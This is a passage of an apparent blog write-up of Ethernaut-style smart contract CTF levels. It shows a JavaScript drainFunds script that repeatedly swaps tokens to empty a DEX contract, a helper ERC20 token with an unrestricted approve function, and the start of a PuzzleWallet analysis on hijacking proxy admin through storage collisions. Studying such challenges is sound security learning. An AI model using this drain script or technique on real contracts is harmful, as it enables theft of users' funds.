</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">43</span><span>flag </span><span class="token" style="color:#d4d4d4">=</span><span> balances</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">token1Balance</span><span class="token" style="color:#d4d4d4">*</span><span>balances</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">token2Balance</span><span class="token" style="color:#d4d4d4">&gt;</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">44</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">45</span><span>    </span><span class="token" style="color:#6a9955">// Token2 balance  = 0. Make sure to set the token3 value to the same value as token1 at the end of this loop.</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">46</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">47</span><span>    flag </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">48</span><span>     </span><span class="token" style="color:#9cdcfe">TOKEN2_ADDRESS</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">49</span><span>     </span><span class="token" style="color:#9cdcfe">TOKEN1_ADDRESS</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#9cdcfe">TOKEN3_ADDRESS</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">50</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">51</span><span></span><span class="token" style="color:#c586c0">while</span><span class="token" style="color:#d4d4d4">(</span><span>flag</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">52</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> balances</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getBalances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">53</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> tokenValues</span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">knowTokenValues</span><span class="token" style="color:#d4d4d4">(</span><span>balances</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">54</span><span>        </span><span class="token" style="color:#569CD6">const</span><span> toSwap </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">getSwapValues</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">55</span><span>        </span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">mostExpensiveToken</span><span class="token" style="color:#d4d4d4">,</span><span>tokenValues</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">cheapestToken</span><span class="token" style="color:#d4d4d4">,</span><span>toSwap</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span class="token" style="color:#9cdcfe">PLAYER</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">56</span><span>        </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token template-string" style="color:#ce9178">swapped </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">toSwap</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">mostExpensiveToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string" style="color:#ce9178"> for  </span><span class="token template-string" style="color:#569cd6">${</span><span class="token template-string" style="color:#9cdcfe">tokenValues</span><span class="token template-string" style="color:#d4d4d4">.</span><span class="token template-string property-access" style="color:#9cdcfe">cheapestToken</span><span class="token template-string" style="color:#569cd6">}</span><span class="token template-string template-punctuation" style="color:#ce9178">`</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">57</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">58</span><span>        flag </span><span class="token" style="color:#d4d4d4">=</span><span> balances</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">token1Balance</span><span class="token" style="color:#d4d4d4">*</span><span>balances</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">token2Balance</span><span class="token" style="color:#d4d4d4">&gt;</span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">59</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">60</span>    
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">61</span><span>    </span><span class="token" style="color:#4ec9b0">console</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Hacked !&quot;</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">62</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">63</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">64</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">65</span><span>module</span><span class="token" style="color:#d4d4d4">.</span><span class="token method-variable function-variable method property-access" style="color:#dcdcaa">exports</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">async</span><span>  </span><span class="token" style="color:#569CD6">function</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">66</span>  
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">67</span><span>  contract </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> contractABI</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">at</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;0x5b9777555BDC7bA0Dee12EBB6d0Fc1E6Dc83b20a&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">68</span><span>  </span><span class="token" style="color:#c586c0">await</span><span> </span><span class="token" style="color:#dcdcaa">drainFunds</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">69</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">70</span>
</span></code></div></pre>
<h4 class="chakra-heading css-6gwv5m" id="solidity contract for test and for the token3">Solidity Contract for test and for the token3</h4>
<p class="chakra-text css-0" node="[object Object]">Make sure to add a reasonable balance to the instance.</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#ce9178">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#c586c0">import</span><span> </span><span class="token" style="color:#ce9178">&quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>contract </span><span class="token" style="color:#4ec9b0">SwappableToken</span><span> is </span><span class="token" style="color:#9cdcfe">ERC20</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>  </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span> string memory name</span><span class="token" style="color:#d4d4d4">,</span><span> string memory symbol</span><span class="token" style="color:#d4d4d4">,</span><span> uint256 initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#9cdcfe">ERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> symbol</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        </span><span class="token" style="color:#dcdcaa">_mint</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span> initialSupply</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address owner</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> address spender</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> uint256 amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#569CD6">super</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">_approve</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">,</span><span> spender</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span></span><span class="token" style="color:#6a9955">// transfer(instanceAddress,ValueYouWant)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span>
</span></code></div></pre>
<h2 class="chakra-heading css-1uc67dn" id="puzzlewallet">PuzzleWallet</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.
Little did they know, their lunch money was at risk…
You&#x27;ll need to hijack this wallet to become the admin of the proxy.
Things that might help::
Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.</p>
</blockquote>
<div class="css-17l36zw"></div>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">We all know that smart contracts code is immutable. Once the smart contract is deployed it cannot be changed that&#x27;s why companies are spending thousands of dollars to make sure that the smart contract is faultless before deployment. Proxies are on the other hand a way to make smart contracts seem upgradable. By adding a new layer in the form of contract we can now which version accepts incoming calls. The code is long and It took me quite a while to get a grasp of it. So I will be highlighting the most interesting parts</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">PuzzleProxy</span><span> is </span><span class="token" style="color:#4ec9b0">UpgradeableProxy</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#6a9955">// Getting to know the storage&#x27;s layout of our contract</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>    address </span><span class="token" style="color:#569CD6">public</span><span> pendingAdmin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    address </span><span class="token" style="color:#569CD6">public</span><span> admin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">proposeNewAdmin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address _newAdmin</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        pendingAdmin </span><span class="token" style="color:#d4d4d4">=</span><span> _newAdmin</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>    </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>    contract </span><span class="token" style="color:#4ec9b0">PuzzleWallet</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        </span><span class="token" style="color:#6a9955">// PuzzleWallet storage&#x27;s layout</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>    using </span><span class="token" style="color:#4ec9b0">SafeMath</span><span> </span><span class="token" style="color:#c586c0">for</span><span> uint256</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    address </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>    </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>        modifier onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span>           </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>whitelisted</span><span class="token" style="color:#d4d4d4">[</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not whitelisted&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>            _</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span>      </span><span class="token" style="color:#6a9955">// Can change the storage slot[1]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span><span>      </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setMaxBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 _maxBalance</span><span class="token" style="color:#d4d4d4">)</span><span> external onlyWhitelisted </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span>      </span><span class="token" style="color:#6a9955">// contract&#x27;s balance should be 0, but wait how much is it now ? </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span><span>      </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">balance</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Contract balance is not 0&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">28</span><span>      </span><span class="token spread" style="color:#d4d4d4">...</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">29</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">30</span><span>      </span><span class="token" style="color:#6a9955">// only owner can add to white list</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">31</span><span>      </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">addToWhitelist</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address addr</span><span class="token" style="color:#d4d4d4">)</span><span> external </span><span class="token" style="color:#d4d4d4">{</span><span>
